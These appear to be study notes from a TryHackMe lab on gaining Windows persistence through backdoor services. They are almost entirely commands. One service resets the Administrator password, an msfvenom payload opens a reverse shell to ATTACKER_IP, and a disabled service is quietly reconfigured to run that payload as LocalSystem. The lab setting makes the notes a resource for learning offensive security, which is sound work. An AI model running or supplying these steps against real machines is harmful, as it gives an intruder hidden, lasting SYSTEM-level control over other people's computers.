## Creating backdoor services


```powershell
# Create a new service 'THMService'
# There must be a space after each equal sign for the command to work.
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto

# Start the service
sc.exe start THMservice
```

- Create and actual executable with reverse shell
```shell
# use `-f exe-service` to generate an executable compatible with Windows Service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f exe-service -o rev-svc.exe
```

 - This executable can now be set as a target for the new service. 
 - Note: the executable must be copied to the target machine first

```shell
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

## Modifying existing service

- any disabled service will be a good candidate, as it could be altered without the user noticing it.
```powershell
# list of available services
sc.exe query state=all

# Get service configuration
sc.exe qc THMService3
```

There are three things we care about when using a service for persistence:

- The executable (`BINARY_PATH_NAME`) should point to our payload.
- The service `START_TYPE` should be automatic so that the payload runs without user interaction.
- The `SERVICE_START_NAME`, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.
- A new executable service can be generated using msfvenom
- Set the new executable as a target for the existing service:
```powershell
# Update the service config with new target
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc.exe" start= auto obj= "LocalSystem"

# start the service
sc.exe start THMService3
```


